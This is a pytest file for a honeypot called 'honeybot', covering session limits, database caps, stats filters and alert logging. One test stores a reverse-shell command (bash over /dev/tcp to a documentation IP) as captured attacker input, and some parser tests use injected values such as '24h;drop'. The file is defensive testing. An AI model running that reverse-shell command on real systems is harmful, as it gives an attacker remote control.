from __future__ import annotations

import asyncio
import logging
import sqlite3
from datetime import datetime, timezone

from honeybot.app import HoneyBot
from honeybot.closing import finalize_session
from honeybot.limits import SessionClock
from honeybot.listeners.http import login_from_body
from honeybot.listeners.line import decode_smtp_plain
from honeybot.store import Store
from honeybot.util import parse_intent, parse_since
from tests.conftest import make_config


def test_since_and_intent_parsers():
    moment = datetime(2026, 10, 3, 12, 0, tzinfo=timezone.utc)
    assert parse_since("24h", now=moment) == "2026-10-02T12:00:00+00:00"
    assert parse_since("all", now=moment) == ""
    assert parse_intent("Fetch_And_Run") == "fetch_and_run"
    for bad in ("yesterday", "0h", "-1d", "24h;drop"):
        try:
            parse_since(bad, now=moment)
        except ValueError:
            pass
        else:
            raise AssertionError(bad)
    try:
        parse_intent("miner;drop")
    except ValueError:
        pass
    else:
        raise AssertionError("чужая метка")


def test_login_and_smtp_parsers():
    assert login_from_body("log=admin&pwd=s3cr3t") == ("admin", "s3cr3t")
    assert login_from_body("note=hello") is None
    import base64

    token = base64.b64encode(b"\x00alice\x00s3cr3t").decode()
    assert decode_smtp_plain(token) == ("alice", "s3cr3t")


async def test_clock_idle_and_ceiling():
    clock = SessionClock(10, 30)
    assert not clock.expired()
    clock.touched -= 11
    assert clock.expired()
    clock.touch()
    assert not clock.expired()
    clock.started -= 31
    assert clock.expired()


async def test_full_database_drops_old_sessions(tmp_path):
    path = tmp_path / "t.db"
    store = Store(path, 512)
    await store.start()
    try:
        assert await store.open_session("old", "203.0.113.1", 1, 22, "ssh")
        await store.finish("old", "banner_grab", "x", {}, {}, stamp=True)
        assert await store.open_session("new", "203.0.113.2", 1, 22, "ssh")
        store._over_cap = lambda: True
        opened = await store.open_session("third", "203.0.113.3", 1, 22, "ssh")
        assert opened is False
        assert await store.session_ids() == []
        stats = await store.stats()
        assert stats["recording"] is False
    finally:
        await store.stop()


async def test_stats_window_skips_old_sessions(tmp_path):
    path = tmp_path / "t.db"
    store = Store(path, 32)
    await store.start()
    await store.open_session("old", "203.0.113.4", 1, 22, "ssh")
    await store.add_command("old", "something-odd", "exec", "something-odd", 0)
    await store.finish("old", "unclassified", "x", {1: []}, {})
    await store.stop()
    conn = sqlite3.connect(path)
    conn.execute(
        "UPDATE sessions SET started_at = ? WHERE id = ?",
        ("2000-01-01T00:00:00+00:00", "old"),
    )
    conn.commit()
    conn.close()
    store = Store(path, 32)
    await store.start()
    try:
        assert (await store.stats(parse_since("24h")))["sessions"] == 0
        assert (await store.stats())["sessions"] == 1
        assert (await store.stats(intent="unclassified"))["top_unclassified"][0]["command"] == "something-odd"
        assert (await store.stats(intent="miner"))["sessions"] == 0
    finally:
        await store.stop()


async def test_alert_log_has_no_payload(tmp_path, caplog):
    store = Store(tmp_path / "t.db", 8)
    await store.start()
    try:
        await store.open_session("abc123", "198.51.100.9", 1, 22, "ssh")
        await store.add_command(
            "abc123",
            "bash -i >& /dev/tcp/203.0.113.8/80",
            "exec",
            "bash -i >& /dev/tcp/<ip>/80",
            0,
        )

        class App:
            def __init__(self, current):
                self.store = current

        with caplog.at_level(logging.WARNING, logger="honeybot"):
            await finalize_session(App(store), "abc123", 1, 1, "")
        assert "reverse_shell" in caplog.text
        assert "198.51.100.9" in caplog.text
        assert "203.0.113.8" not in caplog.text
        assert "bash -i" not in caplog.text
    finally:
        await store.stop()


async def test_activity_extends_idle_but_not_the_ceiling(tmp_path):
    idle = make_config(tmp_path / "idle", {"telnet"})
    idle.limits.session_seconds = 1
    idle.limits.max_session_seconds = 5
    bot = HoneyBot(idle)
    await bot.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["telnet"])
        await asyncio.wait_for(reader.read(64), 2)
        started = asyncio.get_running_loop().time()
        while asyncio.get_running_loop().time() - started < 2.4:
            writer.write(b"\n")
            await writer.drain()
            chunk = await asyncio.wait_for(reader.read(256), 2)
            assert chunk
            await asyncio.sleep(0.4)
        writer.close()
    finally:
        await bot.stop()

    capped = make_config(tmp_path / "cap", {"telnet"})
    capped.limits.session_seconds = 1
    capped.limits.max_session_seconds = 2
    bot = HoneyBot(capped)
    await bot.start()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", bot.bound["telnet"])
        await asyncio.wait_for(reader.read(64), 2)
        started = asyncio.get_running_loop().time()
        closed = False
        while asyncio.get_running_loop().time() - started < 5:
            try:
                writer.write(b"\n")
                await writer.drain()
            except (ConnectionError, OSError, RuntimeError):
                closed = True
                break
            try:
                chunk = await asyncio.wait_for(reader.read(256), 1)
            except TimeoutError:
                continue
            if not chunk:
                closed = True
                break
            await asyncio.sleep(0.3)
        elapsed = asyncio.get_running_loop().time() - started
        writer.close()
        assert closed
        assert elapsed < 4
    finally:
        await bot.stop()
